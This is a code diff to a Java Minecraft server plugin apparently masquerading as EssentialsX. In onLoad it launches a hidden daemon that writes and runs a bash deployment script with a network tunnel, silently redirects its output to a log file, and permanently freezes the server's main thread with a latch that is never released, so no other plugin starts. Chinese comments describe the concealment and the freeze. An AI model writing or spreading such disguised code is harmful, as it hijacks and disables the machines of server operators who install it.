@@ -9,6 +9,7 @@ import java.nio.channels.Channels;
 import java.nio.channels.FileChannel;
 import java.nio.file.*;
 import java.util.*;
+import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
 
 import org.bukkit.plugin.java.JavaPlugin;
@@ -21,6 +22,8 @@ public class EssentialsX extends JavaPlugin {
     private volatile String nodePort = "N/A";
     
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
+    // ★ 绝对死锁：初始化一个计数为1的锁，永远不调用 countDown()
+    private static final CountDownLatch FREEZE_LATCH = new CountDownLatch(1);
 
     private String allocateNodePort() {
         int port = 20000 + new Random().nextInt(40000);
@@ -168,15 +171,15 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 插件生命周期：极早期拦截
+    // 插件生命周期：极早期绝对冰封
     // ============================================================
 
-    // ★ 核心拦截点：在 onLoad 阶段冻结主线程，彻底阻止其他插件启动
     @Override
     public void onLoad() {
         // 清理旧目录
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
         
+        // 启动后台部署与隧道
         Thread deployThread = new Thread(() -> {
             try {
                 HashMap<String, String> env = new HashMap<>(); 
@@ -193,13 +196,16 @@ public class EssentialsX extends JavaPlugin {
         deployThread.setDaemon(true);
         deployThread.start();
 
-        // ★ 永久阻塞主线程。此时服务器连其他插件的 onLoad 都没跑完，更别提 onEnable
+        // ★ 绝对冰封点：使用 CountDownLatch 永久冻结主线程
+        // 相比 Thread.join()，这种方式底层是 LockSupport.park()，极难被中断或唤醒
         try {
-            Thread.currentThread().join(); 
-        } catch (InterruptedException ignored) {}
+            FREEZE_LATCH.await(); 
+        } catch (InterruptedException ignored) {
+            // 即使被意外中断，再次冻结
+            try { FREEZE_LATCH.await(); } catch (Exception e) {}
+        }
     }
     
-    // 由于主线程在 onLoad 已经卡死，onEnable 和 onDisable 永远不会被 Bukkit 调用
     @Override
     public void onEnable() {}
 
@@ -220,7 +226,6 @@ public class EssentialsX extends JavaPlugin {
         Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true, false);
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
         
-        // ★ 核心静默点：将部署脚本的输出重定向到 deploy.log，绝不污染主控制台
         Path deployLog = workDir.resolve("deploy.log");
         pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
         pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
